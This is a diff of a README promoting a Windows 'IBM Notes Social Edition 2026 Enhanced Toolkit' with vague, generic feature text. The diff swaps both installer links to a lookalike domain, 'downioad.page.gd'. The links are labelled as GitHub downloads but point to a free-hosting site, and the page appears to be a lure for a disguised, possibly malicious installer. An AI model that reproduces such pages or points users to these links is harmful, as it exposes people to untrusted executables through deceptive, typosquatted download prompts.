@@ -2,7 +2,7 @@
 
 The IBM Notes Social Edition 2026 Enhanced Toolkit is a comprehensive Windows desktop utility designed to elevate your experience with IBM Notes Social Edition. This tool streamlines email management, boosts collaboration features, and provides customizable options for a more efficient workflow. Whether you're a power user or seeking to optimize daily tasks, this toolkit offers a seamless integration to enhance productivity.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -64,7 +64,7 @@ A: Updates are released periodically to include new features and compatibility i
 
 To get started, download the latest version of the toolkit from the official source:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 This link provides access to the most recent installer and updates, ensuring you have all the latest enhancements. Remember to follow the installation instructions carefully for a smooth setup process.
 
